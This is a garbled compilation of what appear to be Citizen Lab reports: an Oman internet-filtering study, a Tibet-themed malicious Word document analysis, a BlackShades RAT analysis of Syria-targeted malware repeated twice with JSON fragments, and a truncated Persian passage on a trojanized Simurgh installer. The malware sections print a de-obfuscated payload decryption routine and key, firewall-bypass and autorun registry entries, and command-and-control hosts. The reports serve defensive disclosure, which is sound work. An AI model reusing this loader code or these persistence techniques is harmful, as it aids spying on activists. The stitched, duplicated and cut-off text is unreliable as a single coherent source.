inaccessible as a result of blocking by the state ISP in Kazakhstan, which sells its service to KyrgyzTelecom.5 Similar behaviour was observed in Uzbekistan in 2004, where content filtering on one Uzbek ISP closely matched that seen in China, a finding supplemented by evidence that this ISP was purchasing connectivity service from China Telecom.6\nThis brief documents and analyzes the upstream filtering of web content for users of Oman’s Omantel ISP as a result of content restrictions implemented in India. Both India and Oman, it should be noted, already have domestic filtering regimes in place. Previous research by the OpenNet Initiative on Omantel has documented filtering of Internet content related to pornography, circumvention tools, gay and lesbian content, as well as content critical of religion.7 Similar research by the OpenNet Initiative has found that ISPs in India selectively filter content relating to conflict/security and Internet tools, with a high degree of variability between ISPs.8\nOmantel has existing relationships with ISPs in India. Omantel and Indian ISP Bharti Airtel have a traffic peering arrangement through ASNs9 AS8529 and AS9498, respectively.10 Bharti Airtel was in fact reported to be a leading contender to purchase a 25% stake in Omantel during that ISP’s privatization process in 200811; however, by 2011 the sale was reportedly on hold.12 Also in 2008, Bharti Airtel and Omantel were among the 15 companies that partnered to build the Europe India Gateway, a 15,000 kilometer fibre optic cable project connecting 13 countries.13\n Methods\nData was gathered for this research from a number of sources. Access to the Omantel network was obtained through publicly available proxies and through testing undertaken by individuals located in Oman who are customers of Omantel’s service. An automated process was run that attempted to access a list of several hundred URLs suspected to be blocked. The results of this process were analyzed to identify blocked content. The URLs that were identified as blocked were then manually confirmed by testers in Oman.\nLists of content suspected of being blocked were gathered from a number of sources. First, content suspected of blocking in past ONI testing in India was compiled. Second, Anonymous India made public a list of allegedly blocked URLs that the group claims were obtained by hacking of Indian ISP Reliance.14 This list of content was also added to the list of tested URLs.\nFindings\nTesting conducted on June 18-19, 2012 through an Omantel proxy confirmed that Omantel continues to filter the content categories found in previous ONI testing. This filtering is done transparently, as users are presented with an explicit block page as seen in Figure 1 when they attempt to access banned content.\n\nFigure 1: Block page on Omantel\nHowever, for a number of URLs tested in Oman, a different block page was displayed, as seen in Figure 2:\n\nFigure 2: Block page found during testing on Omantel\nThe text of this block page is consistent with numerous reports of block pages employed in content filtering in India.15 A list of several hundred URLs was then tested, with 41 of these found to display the block page seen in Figure 2 (the “India block page”). These URLs were also accessed from the Citizen Lab in Toronto, with no sites found to display the block page text seen in Figure 2.\nThe following URLs were found to be blocked with this block page on Omantel:\n\nhttp://desihits.net\nhttp://freeplaymp3songdownload.com\nhttp://mp3feelings.com\nhttp://hinduexistence.wordpress.com/2012/03/oh-not-again.jpg\nhttp://bollywoodmp4.com\nhttp://mastmag.com\nhttp://bollywoodstop.com\nhttp://indianmasti.net\nhttp://absongs.com\nhttp://123tamilforum.com\nhttp://desiden.mobi\nhttp://imagessearchyahoo.com\nhttp://smashits.com\nhttp://ragalahari.com\nhttp://gogrumogru.com\nhttp://merrimusings.typepad.com\nhttp://dacoolsite.com\nhttp://karachimag.com\nhttp://songbox.pk\nhttp://rkmania.com\nhttp://desijammers.com\nhttp://apunkabollywood.com\nhttp://zinkwap.com\nhttp://topupmp3.com\nhttp://hindimirchi.com\nhttp://mazafm.com\nhttp://www.indybay.org\nhttp://www.bloggernews.net/124029/\nhttp://downloadprovider.me\nhttp://desimusic.com\nhttp://wapmaza.mobi\nhttp://imamali8.com\nhttp://town67.com\nhttp://fun1001.com\nhttp://thenisai.com\nhttp://freeindisongs.com\nhttp://www.bloggernews.net/124029\nhttp://playlist.pk\nhttp://www.chakpak.com/find/images/kamasutra-hindi-movie\nhttp://vmusiq.com\n\nMany of these URLs are sites dedicated to Indian and Pakistani culture and entertainment, including file sharing sites with links to Bollywood movies and Indian and Pakistani music. Others are blogging platforms or media/free expression sites. The URL http://www.indybay.org is the website of the San Francisco Bay Area Independent Media Center, while http://www.bloggernews.net/124029 is a blog that discusses Internet censorship in India.\nA number of factors lead to the conclusion that this is in fact upstream filtering in Oman as a result of content filtering in India. First, the block page seen in Figure 2 refers to the ‘Department of Telecommunications’; India’s telecommunications regulator is called the Department of Telecommunications,16 while Oman’s sector is regulated by the Telecommunications Regulatory Authority.17 Second, traceroutes of attempts to access blocked content demonstrate that traffic passed through India, as shown in Figure 3.\n\nFigure 3: Trace route from Oman to mastmag.com, a restricted website (‘x.x.x.x’ refers to redacted IP addresses)\nIn this trace route, it can be seen in hop #9 that traffic from Oman, where the URL was requested, to the hosting provider in the United States, passes through Bharti Airtel in India. This website, which is an Indian music and movie download site, was blocked with the India block page in Oman. While the passage of network traffic through another country is not in itself unusual, the return of an India block page in Oman would not occur without the passage of network traffic through India.\nNext, much of the content found to be blocked is related to India and does not seem consistent with past filtering practices observed in Oman. This primarily includes file sharing and multimedia sites relating to Indian culture, including Bollywood movies and Indian music. Further, as mentioned above, many of the URLs found to be blocked with the India block page have been reported elsewhere as prohibited content in India. Finally, the text seen in the India block page is widely reported by Indian Internet users and media in discussions of blocked content in India, which content includes many of the URLs found to be blocked in Oman.18\nVariability in results\nThese experiments were run over multiple days from June 18-28, 2012. Testing up to June 24 found that the above list of URLs was blocked consistently. However, testing after June 25 revealed some variability in the results. Testing conducted through a public Omantel proxy on June 25 found that none of the URLs listed above were blocked with the India block page. This result was confirmed by an Omantel user in Oman, who found that none of the URLs listed above were blocked. These results were again confirmed by additional proxy testing on June 27, 2012.\nIt should be noted that this change in filtering behaviour followed a June 22, 2012 ruling by India’s Madras High Court, which modified a previous court order regarding blocking of websites through which certain Bollywood films were shared. The new ruling requires ISPs to block the pirated content on a per-URL basis rather than restricting access to an entire site.19 It is plausible that a loosening of filtering in India as a result of this court order was reflected in upstream filtering in Oman. However, testing conducted through an Omantel proxy on June 28 again confirmed many of the URLs listed above blocked with the India block page.\nThere are a number of possible explanations for this variability in behaviour. First, it is possible that factors including how Omantel routes traffic, and the network status of available routes at the time of testing, may cause packets from Omantel to take a different path to their destination that does not pass through a filtered connection from India. If this is the case, it is possible the change in filtering seen in Oman that coincided with the Indian court’s ruling on filtering was merely a coincidence. Second, it is possible that filtering in India is not consistently applied at all times, a trend seen in other countries.\nLimitations\nThe majority of testing results referenced here were gathered from the use of public proxies in Oman. While testing was done with IP addresses registered to Omantel, it remains possible that this proxy connection provides connectivity that does not reflect the experience of the average user in Oman. However, the results found through the proxy were confirmed by individual users of Omantel on multiple occasions.\nDiscussion\nThe practice of upstream filtering raises a number of questions, including jurisdictional issues and the lack of recourse available to users in Oman. The application of filters in India restricts Internet users in Oman from accessing content, potentially even content produced in Oman itself, as a result of actions taken for domestic purposes within India. Users in Oman did not consent to this blocking, are left with little recourse for challenging these actions, and have limited means of accessing this content, which may or may not be in violation of Omani regulations. Combined with the significant filtering implemented by Omantel itself, this practice places Internet users in Oman behind multiple layers of national-level filtering.\nAcknowledgements\nWe would like to thank Bennett Haselton of Peacefire.org and Circumventor.com, as well as Riyadh Al Balushi, for assistance with this research.\nData\nRaw data for the proxy test results cited here can be found in the following formats:\n\nSummarized results [Google doc]\nSummarized results [csv]\nRaw data [zip – html, csv, txt]\n\nThe data presented is from a June 18, 2012 test run of a URL list through two Omantel proxies, as well as from the Czech Republic as a control.

    "text": "\n\t\t\t\tAn Analysis of the Repurposing of Legitimate Content in Targeted Malware Attacks\nPart II of Information Operations and Tibetan Rights in the Wake of Self-Immolations\nDownload PDF\nKey Findings\n\nOn June 15, 2012, a malicious email with the subject “FW: the new decision of EUROPEAN PARLIAMENT about tibetan human right in China” was sent to over 80 unique email addresses, targeting individuals active in the Tibetan rights community.\n\n\nAttached to the email is a malicious .doc file — characterized by the email text as containing the June 14, 2012 resolution of the European Parliament on the human rights situation in Tibet — in which is embedded malicious code that executes when the attachment is opened.\n\n\nThe malware utilized in this attack is the same as that described in other reports detailing attacks with Tibet-related themes. Once the malicious code is executed, it starts to communicate with a command and control (C2) server located in Hong Kong.\n\n\nThis attack raises serious questions concerning misappropriation of the intellectual property and political discourse of public entities such as the European Parliament in furtherance of information operations designed to compromise civil society organizations.\n\n\nThe Citizen Lab recommends that the European Parliament and other stakeholders voice concern and engage in serious consideration and public debate regarding targeted cyber threats against civil society, which have resulted in chilling effects and information denial.\n\nOverview\nA common technique used by attackers in crafting malicious emails is to repurpose legitimate, authentic content in order to persuade a recipient to click a link or open an attachment that launches a hidden exploit. Often such content is taken from official announcements, websites of nongovernmental organizations, or publicly-available media such as news sites, and repackaged within an email that includes a malicious attachment or link. For example, malicious emails have circulated attaching content such as an invitation to the 2010 Nobel Peace Prize ceremony and statements made in international fora.\nRecently, attackers targeting the Tibetan community have seized on a relatively high-profile document to incorporate in targeted malware efforts: the June 14, 2012 resolution of the European Parliament (EP) on the human rights situation in Tibet, which references the 38 Tibetan self-immolations that had occurred as of that date, and calls on the Chinese authorities to take action to respect and protect Tibetan rights.\nWhile such a tactic is not unusual, it does raise a number of questions surrounding the use of legitimate political resources for illegitimate purposes, and the modus operandi of the attackers in this particular circumstance. Indeed, one effect (and perhaps purpose) of attacks such as this is to undermine the impact of the original content; here, an EP resolution designed to promote Tibetan rights was used as bait to compromise those very same rights, resulting in a chilling effect whereby the Tibetan community is discouraged from circulating information on the resolution, which is now associated with malware. In this report, we review some technical details of the targeted malware attack, and make recommendations regarding consideration of targeted cyber threats against civil society.\nTechnical Analysis\nOn June 15, 2012, an email with the subject “FW: the new decision of EUROPEAN PARLIAMENT about tibetan human right in China” was sent to over 80 unique email addresses, targeting individuals active in the Tibetan rights community. A screenshot of the email, submitted to the Citizen Lab for analysis, is included below:\n\nThe body of the message reads:\nHere is the new decision of EUROPEAN PARLIAMENT about tibetan human right in China, and it is so usefull for us to strive for independent nation. Please forward it to tibetan.\nThe address in the “From” header of the email appears to be from a legitimate Tibetan organization — likely a compromised web mail account, with the recipients of the attack perhaps coming from the account’s contact list.\nIt is noteworthy that, while the text of the malicious email references the European Parliament (EP) decision of June 14, the attachment itself is actually the precursor to that resolution, namely, the EP’s joint motion for resolution of June 12, 2012. The use of that document instead of the resolution proper is likely the result of the availability of that file in a prepackaged, downloadable Word document format on the EP’s website; by contrast, as of June 20, 2012, the June 14 resolution was not available as a separate downloadable document, and was displayed only in HTML on the website.\n\nJoint motion has downloadable .doc \n\nResolution does not have .doc available\nThe attachment to the malicious email is a Microsoft Word document titled “EP joint motion for resolution – TIBET – 06.2012.doc” with the MD5 signature 81f3a6e7a73a9845c6eb9a3d46597223. When the attachment is opened, Word briefly displays a document that contains the text “111111111” while exploiting the Microsoft Word vulnerability and dropping several files that are embedded in the attachment.\n\nThe original file then closes and Word opens a clean document (dropped in the user’s temporary directory with the same filename) that contains the full text of the joint motion for resolution, in a version that is identical in appearance to the document downloadable from the EP website.\n\nWhile the file is nearly identical to the Microsoft Word file that can be downloaded from the European Parliament’s site, the metadata in the documents differs in interesting ways:\n\n\n\nMetadata\nAuthentic File\nDropped Clean File\n\n\n\n\n\n\nMD5\n\n\n\n\n\n8882c40ef1786efb98ea251e247bfbee\n40f41c077e03d72a39eb1bd7bf6e3341\n\n\n\n\n\n\nLast Saved By\n\n\n\n\n\n\n\n\n\nHSwallow\n\n\n\n\n\nlebrale\n\n\nCreate Time/Date\nTue., Jun. 12 09:11:00 2012\nWed., Jun. 13 11:39:00 2012\n\n\nLast Saved Time/Date\nTue., Jun. 12 09:11:00 2012\nWed., Jun. 13 11:39:00 2012\n\n\n\nSuch details suggest that the attacker was in this instance familiar with the work of the EP regarding the Tibetan human rights situation: he or she was aware of the joint motion for resolution; may have downloaded a copy of the document on June 13 (per the create time/date metadata), the day after the joint motion was released, and embedded it in the new malicious file “EP joint motion for resolution – TIBET – 06.2012.doc”; and may have held onto that file deliberately, waiting to circulate it until June 15, the day after the resolution to which it corresponds was officially adopted — perhaps timed for when the document would attract the most interest.\nAs the clean file is opened, malicious code executes and communicates with a command and control (C2) server located in Hong Kong. The IP address of the C2 server is the same as the one used to send the targeted email from the web mail account: 114.142.147.51. This is a static IP address on DYXnet (a Chinese Internet service provider). The domain name vv338.com also points to this IP address; however, the malware does not perform a DNS lookup and there is no evidence that whoever registered the domain is associated with this attack.\nThe dropped executable code is the same as that described by Symantec in a May 24, 2012 blog post, which details a targeted attack also incorporating Tibet-related themes. The exact filename of the original dropped executable is different (NvDev.exe instead of NvSmart.exe), and was likely changed to avoid antivirus detection. The program has a valid digital signature because it is a legitimate program, which loads and calls code from a companion DLL (dynamic link library). In this case, the attackers have provided a fake DLL which contains the malicious code. This technique, known as “DLL Hijacking,” bypasses warnings that a program is not digitally signed — which may be a warning to the user that something is not right.\nBelow are screenshots of the payload code (in the malware referencing the EP resolution, in BOOT.LDR; in the malware from the Symantec post, loaded from an executable). Aside from the addresses being different, the code is the same.\n\nCode dropped by the HHDLschedule.doc malware described by Symantec.\n\nCode dropped by the “EP joint motion for resolution – TIBET – 06.2012.doc” document.\nRecommendations\nThis attack demonstrates the ease of repurposing legitimate content in a manner that is likely to appear authentic to, and prompt the interest of, the intended target of the malware. It also raises serious questions concerning misappropriation of the intellectual property and political resources of public entities — in this case, utilizing an EP resolution to compromise the Tibetan community, the very individuals the EP, on behalf of European citizens, sought to protect. The Citizen Lab recommends:\n\nThat members of the Tibetan community and others concerned with Tibetan rights exercise caution concerning “official” documents circulated as attachments, including those referencing the June 14 EP resolution (for tips on preventing exposure to malware, see the Citizen Lab’s Recommendations for Defending Against Targeted Cyber Threats);\n\n\nThat the European Parliament, in light of this recent example of malware attacks incorporating the EP’s own work in order to target human rights organizations and activists, voice its concern publicly about this incident. The Citizen Lab also recommends that the EP engage in serious consideration and public debate regarding targeted cyber threats against civil society in general; and\n\n\nThat policy and technical communities engage in closer collaboration and discussion of the threats that are now increasingly common against civil society in cyberspace, and work to identify measures to proactively defend against and mitigate such threats.\n\nMedia Coverage\n\nCyberwar, Syrian Style, Fast Company, 21 June 2012\nTibetan Activists Targeted By Spoof European Parliament E-Mail, Radio Free Europe / Radio Liberty, 21 June 2012\n\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF\nThe use of remote surveillance software against activists has been a feature of the ongoing conflict in Syria. In February 2012, CNN reported that “Computer spyware is the newest weapon in the Syrian conflict”. Since then numerous electronic campaigns targeting Syrian activists have been observed. These have included: a phishing campaign involving the compromise of a high profile Syrian opposition figure; malware targeting activists by claiming to be documents regarding the foundation of a Syrian revolution leadership council; and, malware purporting to be a plan to assist the city of Aleppo.\nThe majority of these attacks have involved the use of Dark Comet RAT. Remote Administration Tools (RAT) provide the ability to remotely survey the electronic activities of a victim by keylogging, remote desktop viewing, webcam spying, audio-eavesdropping, data exfiltration, and more.\nThe use of Dark Comet in this conflict has been well documented. This RAT was the toolkit used in the malware reported on by CNN and also in the campaigns using fraudulent revolutionary documents.\nIn addition to Dark Comet, we have seen the use of Xtreme RAT reported on by the Electronic Frontier Foundation (EFF) and F-Secure.\nToday, the EFF and Citizen Lab report on the use of a new toolkit by a previously observed attacker. This actor has been circulating malware which surreptitiously installs BlackShades RAT on victims machines. This RAT is a commercial tool which advertises the following:\n“BlackShades Remote Controller also provides as an efficient way of turning your machine into a surveillance/spy-device or to spy on a specific system.”\nIt is being distributed via the compromised Skype accounts of Syrian activists in the form of a “.pif” file purporting to be an important new video.\n0d1bd081974a4dcdeee55f025423a72b new_new .pif\nOn execution the following files are dropped:\nC:\\Documents and Settings\\Administrator\\Templates\\VSCover.exe\nmd5: 291ce2c51e5ea57b571d6610e1d324f9\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\local3.exe\nmd5: 78902e074a7ed514e0f5dca584cd05a5\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\D3D8THK.exe\nmd5: 0d1bd081974a4dcdeee55f025423a72b\nA keylogger file is then created in a the user’s temporary directory:\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\data.dat\nNote that ‘D3D8THK.exe’ is copy of the original file. ‘local3.exe’ appears to be a version of AppLaunch.exe, the Microsoft ClickOnce Launcher.\nThe following registry entries are created to allow the dropped programs through the firewall.\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe: “C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe:*:Enabled:Windows Messanger”\nHKLM\\SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe: “C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe:*:Enabled:Windows Messanger”\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe: “C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe:*:Enabled:Windows Messanger”\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe: “C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe:*:Enabled:Windows Messanger”\n\nNote the misspelling of “Messenger” as “Messanger”.\n“VSCover.exe” is added to autoruns to enable persistence.\nHKU\\s-1-5-21-1177238915-1336601894-725345543-500\\software\\microsoft\\windows\\currentversion\\run\\Microsoft® Windows® Operating System C:\\Documents and Settings\\Administrator\\Templates\\VSCover.exe REG_SZ 0\nVSCover.exe contains “Libra” (30209 bytes) as a .NET resource which is encrypted using a weak method. Decryption is possible using the key stored internally. Once decrypted, it is loaded as a .NET assembly and the Piept() function is called.1\nOne characteristic stands out in the Class1.Main() function: invoking an obfuscated function in a resource.\nClass1.Main: Resource12.Method.Invoke(null, null)\nTracing the value of Resource12.Method provides:\nResource8.encryptedassembly = Resource13.decrypt(Libra, “zuk65x7F0h8034E2KJ8rkjZ2BudbdqD”);\nResource10.Appdomainn = AppDomain.CurrentDomain.Load(Resource8.encryptedassembly);\nResource11.Typee = Resource10.Appdomainn.GetType(“Libra.Mameloane”);\nResource12.Method = Resource11.Typee.GetMethod(“Piept”);\nSubstituting out the functions and variables, the decryption routine looks like this:\npublic static byte[] decrypt(byte[] x, string y)\n{\nreverse(x);\nResource1.cdfsdfsf = x[x.length – 1];\nResource3.kkuythfgh = Encoding.Defaults.GetBytes(y);\nResource2.cfhtfgjdty = new byte[x.length + 1];\nint z = 0;\nwhile (z <= (x.Length – 1))\n{\nResource2.cfhtgjdty[z] = x[z] ^ Resource1.cdfsdfsf ^ Resource3.kuythfgh[Resource4.Bravo];\nArray.Reverse(Resource3.kuytfhfgh);\nif (Resource4.Bravo == (Resource3.kuytfhfgh.Length – 1))\n{\nResource4.Bravo = 0;\n}\nelse\n{\nResource4.Bravo++;\n}\nz++;\n}\nArray.Resize(Resource2.cfhfgjdty, Resource2.cfhfgjdty.Length – 2);\nreturn Resource2.cfhtfgjdty;\n}\nLibra has 3 classes: Mameloane2, RuntimePortableExecutable (implementing PE headers, methods for binaries to run in WinXP and Win7), and Xorxorxor (implementing decryption methods including XOR). Libra also contains the VSCover.exe program itself as an unencrypted resource.\nAs seen above, VSCover will call the Mameloane.Piept() function in Libra. Piept() will reload the main D3D8THK program, splitting it by the string “p8D-T-4M0t_c__hy”. This string can be found in an invalid Version resource of the original binary. Looking at the code, it can be seen that the data in this resource splits out to another encrypted binary and some configuration options.\nThe fields extracted from the resource this way are:\n[0]: pre-useful stuff\n[1]: encrypted binary\n[2]: empty – used as key in Xorxorxor(key).PolyDeCrypt(binary)\n[3]: False – does Piept() call Startup()?\n[4]: True – does Piept() call Injection()?\n[5]: False – does Piept() call AppLaunch()?\n[6]: True – does Piept() call Vbc()?\n[7]: False – does Piept() call FilePersistece()?\n[8]: empty\nThe resource start and first marker string, followed by the encrypted binary data:\n\nThe configuration options (note the True and False strings):\n\nNo matter what the configuration options, Piept() will decrypt the binary, possibly using a one-byte XOR key first. In this case, the field was empty (see above at 0x60419), so the following decryption was used only:\n\nThe binary decrypts to a Visual Basic executable, which can be identified as BlackShades RAT:\n\nThis makes an outbound network connection on 4444/TCP to alosh66.myftp.org.

    "text": "\n\t\t\t\tDownload PDF version\nThe use of remote surveillance software against activists has been a feature of the ongoing conflict in Syria.  In February 2012, CNN reported that “Computer spyware is the newest weapon in the Syrian conflict”. Since then numerous electronic campaigns targeting Syrian activists have been observed. These have included: a phishing campaign involving the compromise of a high profile Syrian opposition figure; malware targeting activists by claiming to be documents regarding the foundation of a Syrian revolution leadership council; and, malware purporting to be a plan to assist the city of Aleppo.\nThe majority of these attacks have involved the use of Dark Comet RAT. Remote Administration Tools (RAT) provide the ability to remotely survey the electronic activities of a victim by keylogging, remote desktop viewing, webcam spying, audio-eavesdropping, data exfiltration, and more.\nThe use of Dark Comet in this conflict has been well documented. This RAT was the toolkit used in the malware reported on by CNN and also in the campaigns using fraudulent revolutionary documents.\nIn addition to Dark Comet, we have seen the use of Xtreme RAT reported on by the Electronic Frontier Foundation (EFF) and F-Secure.\nToday, the EFF and Citizen Lab report on the use of a new toolkit by a previously observed attacker. This actor has been circulating malware which surreptitiously installs BlackShades RAT on victims machines. This RAT is a commercial tool which advertises the following:\n“BlackShades Remote Controller also provides as an efficient way of turning your machine into a surveillance/spy-device or to spy on a specific system.”\nIt is being distributed via the compromised Skype accounts of Syrian activists in the form of a “.pif” file purporting to be an important new video.\n0d1bd081974a4dcdeee55f025423a72b new_new .pif\nOn execution the following files are dropped:\nC:\\Documents and Settings\\Administrator\\Templates\\VSCover.exe\nmd5: 291ce2c51e5ea57b571d6610e1d324f9\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\local3.exe\nmd5: 78902e074a7ed514e0f5dca584cd05a5\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\D3D8THK.exe\nmd5: 0d1bd081974a4dcdeee55f025423a72b\nA keylogger file is then created in a the user’s temporary directory:\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\data.dat\nNote that ‘D3D8THK.exe’ is copy of the original file. ‘local3.exe’ appears to be a version of AppLaunch.exe, the Microsoft ClickOnce Launcher.\nThe following registry entries are created to allow the dropped programs through the firewall.\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe: “C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe:*:Enabled:Windows Messanger”\nHKLM\\SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe: “C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe:*:Enabled:Windows Messanger”\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe: “C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\AppLaunch.exe:*:Enabled:Windows Messanger”\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe: “C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\local3.exe:*:Enabled:Windows Messanger”\n\nNote the misspelling of “Messenger” as “Messanger”.\n“VSCover.exe” is added to autoruns to enable persistence.\nHKU\\s-1-5-21-1177238915-1336601894-725345543-500\\software\\microsoft\\windows\\currentversion\\run\\Microsoft® Windows® Operating System C:\\Documents and Settings\\Administrator\\Templates\\VSCover.exe REG_SZ 0\nVSCover.exe contains “Libra” (30209 bytes) as a .NET resource which is encrypted using a weak method. Decryption is possible using the key stored internally. Once decrypted, it is loaded as a .NET assembly and the Piept() function is called.1\nOne characteristic stands out in the Class1.Main() function: invoking an obfuscated function in a resource.\nClass1.Main: Resource12.Method.Invoke(null, null)\nTracing the value of Resource12.Method provides:\nResource8.encryptedassembly = Resource13.decrypt(Libra, “zuk65x7F0h8034E2KJ8rkjZ2BudbdqD”);\nResource10.Appdomainn = AppDomain.CurrentDomain.Load(Resource8.encryptedassembly);\nResource11.Typee = Resource10.Appdomainn.GetType(“Libra.Mameloane”);\nResource12.Method = Resource11.Typee.GetMethod(“Piept”);\nSubstituting out the functions and variables, the decryption routine looks like this:\npublic static byte[] decrypt(byte[] x, string y)\n{\nreverse(x);\nResource1.cdfsdfsf = x[x.length – 1];\nResource3.kkuythfgh = Encoding.Defaults.GetBytes(y);\nResource2.cfhtfgjdty = new byte[x.length + 1];\nint z = 0;\nwhile (z <= (x.Length – 1))\n{\nResource2.cfhtgjdty[z] = x[z] ^ Resource1.cdfsdfsf ^ Resource3.kuythfgh[Resource4.Bravo];\nArray.Reverse(Resource3.kuytfhfgh);\nif (Resource4.Bravo == (Resource3.kuytfhfgh.Length – 1))\n{\nResource4.Bravo = 0;\n}\nelse\n{\nResource4.Bravo++;\n}\nz++;\n}\nArray.Resize(Resource2.cfhfgjdty, Resource2.cfhfgjdty.Length – 2);\nreturn Resource2.cfhtfgjdty;\n}\nLibra has 3 classes: Mameloane2, RuntimePortableExecutable (implementing PE headers, methods for binaries to run in WinXP and Win7), and Xorxorxor (implementing decryption methods including XOR). Libra also contains the VSCover.exe program itself as an unencrypted resource.\nAs seen above, VSCover will call the Mameloane.Piept() function in Libra. Piept() will reload the main D3D8THK program, splitting it by the string “p8D-T-4M0t_c__hy”. This string can be found in an invalid Version resource of the original binary.  Looking at the code, it can be seen that the data in this resource splits out to another encrypted binary and some configuration options.\nThe fields extracted from the resource this way are:\n[0]: pre-useful stuff\n[1]: encrypted binary\n[2]: empty – used as key in Xorxorxor(key).PolyDeCrypt(binary)\n[3]: False – does Piept() call Startup()?\n[4]: True  – does Piept() call Injection()?\n[5]: False – does Piept() call AppLaunch()?\n[6]: True  – does Piept() call Vbc()?\n[7]: False – does Piept() call FilePersistece()?\n[8]: empty\nThe resource start and first marker string, followed by the encrypted binary data:\n\nThe configuration options (note the True and False strings):\n\nNo matter what the configuration options, Piept() will decrypt the binary, possibly using a one-byte XOR key first. In this case, the field was empty (see above at 0x60419), so the following decryption was used only:\n\nThe binary decrypts to a Visual Basic executable, which can be identified as BlackShades RAT:\n\nThis makes an outbound network connection on 4444/TCP to alosh66.myftp.org.

برای دور زدن از سانسور استفاده شده است. با توجه به حجم ۱ مگابایتی این نرم‌افزار، کاربران در مدت زمان معقولی این فایل را با سرعت کم می‌‌توانند دانلود کنند، مشخصه‌ای که این نرم افزار را برای بسیاری از کاربران در داخل ایران مناسب می‌‌سازد. همچنین این نرم‌افزار بدون نیاز به نصب برروی کامپیوتر و داشتن حقوق مجری قابل اجرامی‌‌باشد. به همین دلیل، قابلیت کپی شدن و استفاده  بروی کامپیوترهای متعدد را دارد. برای مثال، در اینترنت کافه.\nسیمرغ را می  توان بطور رایگان از وب سایت رسمی اش دانلود کرد.\nhttps://simurghesabz.net/.\nپس از اجرا کردن فایل دانلود شده. کارخواه سیمرغ باز می شود وقتی که کاربر بر روی گزینه «استارت» ( آغاز) کلیک کند٬  سیمرغ تلاش می کند تا ارتباط امنی را برقرار کند.  سپس، پنجره جدیدی درپنجره مرورگر اینترنت اکسپلورر باز می شود تا صفحه تستی را به کاربران ارایه دهد که تایید می کند که ارتباط امن از طریق کشور دیگری بر قرار شده است.\n\nما اخیرا متوجه شدیم که نرم‌ افزار سیمرغ برای دور زدن از سانسوردر کشور سوریه نیز  به کاربران پیشنهاد شده و میان آنها در حال پخش است.  این اطلاعات موجب به کشف و بررسی‌ نسخه دست‌کاری شده سیمرغ انجامید.\nاین نسخه مخرب نرم افزار سیمرغ، علاوه بر نصب نرم افزار سیمرغ، یک “در پشتی‌” مضر هم برروی کامپیوتر قربانی نصب می‌‌کند. این نرم افزار تحت نام « Simurgh-setup.zip  » توزیع شده و از طریق هش‌های « md5 » و «sha256» قابل شناسایی است.\n5e2a714fdfc2309af843056e8c5ae7d3

